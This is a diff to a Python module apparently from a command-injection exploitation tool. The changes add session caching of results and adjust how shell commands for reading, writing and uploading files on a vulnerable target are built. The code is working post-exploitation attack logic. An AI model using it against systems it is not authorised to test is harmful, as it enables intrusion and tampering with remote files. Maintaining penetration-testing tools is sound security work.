@@ -21,6 +21,7 @@ import urllib2
 
 from src.utils import menu
 from src.utils import settings
+from src.utils import session_handler
 
 from src.thirdparty.colorama import Fore, Back, Style, init
 from src.core.injections.results_based.techniques.classic import cb_injector
@@ -40,8 +41,13 @@ def file_read(separator, TAG, prefix, suffix, whitespace, http_request_method, u
   else:
     cmd = settings.FILE_READ + file_to_read
   response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
-  shell = cb_injector.injection_results(response, TAG)
-  shell = "".join(str(p) for p in shell)
+  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
+    # Evaluate injection results.
+    shell = cb_injector.injection_results(response, TAG)
+    shell = "".join(str(p) for p in shell)
+    session_handler.store_cmd(url, cmd, shell, vuln_parameter)
+  else:
+    shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
   if menu.options.verbose:
     print ""
   if shell:
@@ -95,7 +101,7 @@ def file_write(separator, TAG, prefix, suffix, whitespace, http_request_method, 
     # Find filename
     filname = os.path.basename(dest_to_write)
     tmp_filname = "tmp_" + filname
-    cmd = settings.FILE_WRITE + content + " > " + tmp_filname
+    cmd = settings.FILE_WRITE + content + ">" + tmp_filname
     if not menu.options.alter_shell :
       cmd = "\"" + cmd + "\""
     response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
@@ -118,7 +124,7 @@ def file_write(separator, TAG, prefix, suffix, whitespace, http_request_method, 
     dest_to_write = path + "\\" + filname
 
   else:
-    cmd = settings.FILE_WRITE + " '" + content + "'" + " > " + "'" + dest_to_write + "'"
+    cmd = settings.FILE_WRITE + " '" + content + "'" + ">" + "'" + dest_to_write + "'"
     response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
     shell = cb_injector.injection_results(response, TAG)
     shell = "".join(str(p) for p in shell)
@@ -174,6 +180,7 @@ def file_upload(separator, TAG, prefix, suffix, whitespace, http_request_method,
       cmd = "dir " + dest_to_upload + ")"
     else:  
       cmd = "echo $(ls " + dest_to_upload + ")"
+
     response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
     shell = cb_injector.injection_results(response, TAG)
     shell = "".join(str(p) for p in shell)
@@ -202,8 +209,5 @@ def do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, ur
   if menu.options.file_read:
     file_read(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
     settings.FILE_ACCESS_DONE = True 
-
-  if settings.FILE_ACCESS_DONE:
-    print ""
 
 # eof
